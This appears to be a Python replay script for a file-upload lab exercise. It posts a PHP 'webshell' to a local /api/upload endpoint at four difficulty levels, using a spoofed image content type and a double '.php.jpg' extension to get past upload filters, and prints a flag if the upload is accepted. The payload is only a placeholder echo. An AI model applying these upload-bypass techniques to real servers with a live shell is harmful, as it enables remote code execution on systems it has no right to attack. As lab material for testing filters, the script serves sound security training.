#!/usr/bin/env python3
"""Replay the file-upload scenario. Standard library only."""
import json
import sys
import urllib.error
import urllib.request
import uuid

def _post_multipart(base, path, filename, content_type, file_bytes):
    url = base.rstrip("/") + path
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    ).encode("utf-8") + file_bytes + f"\r\n--{boundary}--\r\n".encode("utf-8")

    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    payloads = {
        "low": ("webshell.php", "text/plain", b"<?php echo 'simulated'; ?>"),
        "medium": ("webshell.php", "image/jpeg", b"<?php echo 'simulated'; ?>"),
        "high": ("webshell.php.jpg", "image/jpeg", b"<?php echo 'simulated'; ?>"),
        "impossible": ("webshell.php.jpg", "image/jpeg", b"<?php echo 'simulated'; ?>"),
    }
    filename, ct, content = payloads.get(level, payloads["low"])
    status, data = _post_multipart(base, "/api/upload", filename, ct, content)
    print(f"  POST /api/upload ({filename}, {ct}) -> HTTP {status}")
    if status == 200:
        print(f"  ✓ Upload accepted: stored_as={data.get('stored_as')}")
        if "flag" in data:
            print(f"  🚩 Flag: {data['flag']}")
        return True
    print(f"  ✗ Rejected: {data.get('reason')}")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[file-upload] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
